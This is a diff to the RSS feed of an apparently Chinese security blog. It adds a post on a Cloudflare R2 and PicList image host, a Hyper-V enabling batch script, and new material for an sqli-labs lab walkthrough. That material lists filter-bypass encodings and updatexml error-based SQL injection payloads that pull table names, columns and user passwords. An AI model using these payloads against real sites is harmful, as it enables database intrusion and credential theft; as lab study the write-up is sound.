@@ -7,7 +7,107 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Winglet</copyright>
-        <lastBuildDate>Mon, 24 Jun 2024 11:50:50 +0800</lastBuildDate><atom:link href="https://blog.winglet.com/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 15 Sep 2024 23:35:57 +0800</lastBuildDate><atom:link href="https://blog.winglet.com/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Cloudflare&#43;piclist搭建图床</title>
+        <link>https://blog.winglet.com/p/cloudflare-piclist%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</link>
+        <pubDate>Sun, 15 Sep 2024 23:35:57 +0800</pubDate>
+        
+        <guid>https://blog.winglet.com/p/cloudflare-piclist%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</guid>
+        <description>&lt;img src="https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409160012294.lnk https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409160012295.png" alt="Featured image of post Cloudflare&#43;piclist搭建图床" /&gt;&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+&lt;p&gt;换个图床&lt;/p&gt;
+&lt;h2 id=&#34;cloudflare创建存储库&#34;&gt;cloudflare创建存储库&lt;/h2&gt;
+&lt;p&gt;左边栏选择&lt;code&gt;R2-概述&lt;/code&gt;，然后点击&lt;code&gt;创建存储桶&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409152350828.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240915235034622&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接下来自定义存储桶的名称，这样就创建好了自己的存储桶&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409152354343.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240915235442221&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进入存储桶的设置界面&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409152358882.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240915235802764&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;允许访问子域名，然后就会生成一个可以公共访问的url&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409152359319.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240915235920226&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409152359553.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240915235935485&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以在这两个中选择一个&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409152359215.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240915235958106&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;之后会有密钥等重要信息，需要保存下来&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409160001204.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240916000121147&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;piclist&#34;&gt;piclist&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409160002481.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240916000216319&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;自定义节点就是编辑api令牌中的地址
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;自定义域名就是之前存储库生成的url
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        <item>
         <title>应急响应实战笔记</title>
         <link>https://blog.winglet.com/p/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/</link>
         <pubDate>Fri, 07 Jun 2024 21:49:24 +0800</pubDate>
@@ -932,7 +1032,7 @@
         <pubDate>Sun, 14 Apr 2024 22:48:59 +0800</pubDate>
         
         <guid>https://blog.winglet.com/p/sql-labs%E9%9D%B6%E5%9C%BA-%E6%9B%B4%E6%96%B0%E4%B8%AD/</guid>
-        <description>&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+        <description>&lt;img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202406270744823.gif" alt="Featured image of post Sql Labs靶场 [更新中]" /&gt;&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
 &lt;p&gt;之前总是打了几关就摆了，这次一定打完。&lt;/p&gt;
 &lt;h2 id=&#34;sql注入基础&#34;&gt;sql注入基础&lt;/h2&gt;
 &lt;h2 id=&#34;less---1&#34;&gt;less - 1&lt;/h2&gt;
@@ -1486,8 +1586,26 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;添加了新的规则，所以现在不能使用逻辑运算符、注释符以及空格符。&lt;/p&gt;
-&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+&lt;p&gt;添加了新的规则，所以现在不能使用逻辑运算符、注释符以及空格符。这次就需要进行绕过。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;绕过空格
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%09 tab键 %0a 新建一行 %0c 新的一页 %od return功能 %0b tab键垂直 %a0 空格   
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;绕过AND
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;amp;&amp;amp;  %26%26
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;绕过or
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;||  %7C%7C
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只要如此绕过，接下来就可以正常注入。不过可能本地建的apache服务没有解析功能，所以还得用&lt;code&gt;()&lt;/code&gt;方法绕过。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;))),1))||&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;爆表&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;aandnd(table_name=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)))),1))||&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;爆字段&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;爆密码账户&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
 &lt;h3 id=&#34;get传参和post传参注释符使用的不同&#34;&gt;get传参和post传参注释符使用的不同&lt;/h3&gt;
 </description>
         </item>
@@ -2592,14 +2710,14 @@
 </description>
         </item>
         <item>
-        <title>部署aspcms之数据库错误解决方法</title>
-        <link>https://blog.winglet.com/p/%E9%83%A8%E7%BD%B2aspcms%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</link>
+        <title>疑难杂症</title>
+        <link>https://blog.winglet.com/p/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/</link>
         <pubDate>Mon, 22 Jan 2024 17:45:52 +0800</pubDate>
         
-        <guid>https://blog.winglet.com/p/%E9%83%A8%E7%BD%B2aspcms%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</guid>
-        <description>&lt;img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/640.png" alt="Featured image of post 部署aspcms之数据库错误解决方法" /&gt;&lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
+        <guid>https://blog.winglet.com/p/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/</guid>
+        <description>&lt;img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/640.png" alt="Featured image of post 疑难杂症" /&gt;&lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
 &lt;p&gt;决定写这么一个分类，主要是记录一下我平时在做些东西时遇到的各种奇奇怪怪的问题，以及我是怎么用莫名方法解决的。然后以后我再遇到同样问题的时候也可能有办法解决。&lt;/p&gt;
-&lt;h3 id=&#34;问题&#34;&gt;问题&lt;/h3&gt;
+&lt;h2 id=&#34;部署aspcms之数据库错误解决方法&#34;&gt;部署aspcms之数据库错误解决方法&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/d558ef4a47d5352366a617e42a36b57.png&#34;
 	
 	
@@ -2624,6 +2742,14 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;具体修改哪个不清楚，反正你开个虚拟机然后赋予所有用户所有权限就行。&lt;/p&gt;
+&lt;h2 id=&#34;windows-10-家庭版没有hyper-v服务&#34;&gt;windows 10 家庭版没有hyper-V服务&lt;/h2&gt;
+&lt;p&gt;新建一个记事本&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;pushd&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;%~dp0&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; /b &lt;span class=&#34;nv&#34;&gt;%SystemRoot%&lt;/span&gt;\servicing\Packages\*Hyper-V*.mum &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;hyper-v.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;/f&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;%%&lt;/span&gt;i &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;findstr /i . hyper-v.txt 2^&amp;gt;nul&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; dism /online /norestart /add-package:&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;%SystemRoot%&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;\servicing\Packages\&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;%%&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;i&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;del&lt;/span&gt; hyper-v.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Dism /online /enable-feature /featurename:Microsoft-Hyper-V-All /LimitAccess /ALL
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;改为&lt;code&gt;1.cmd&lt;/code&gt;, 右键并以管理员身份运行&lt;/p&gt;
 </description>
         </item>
         <item>
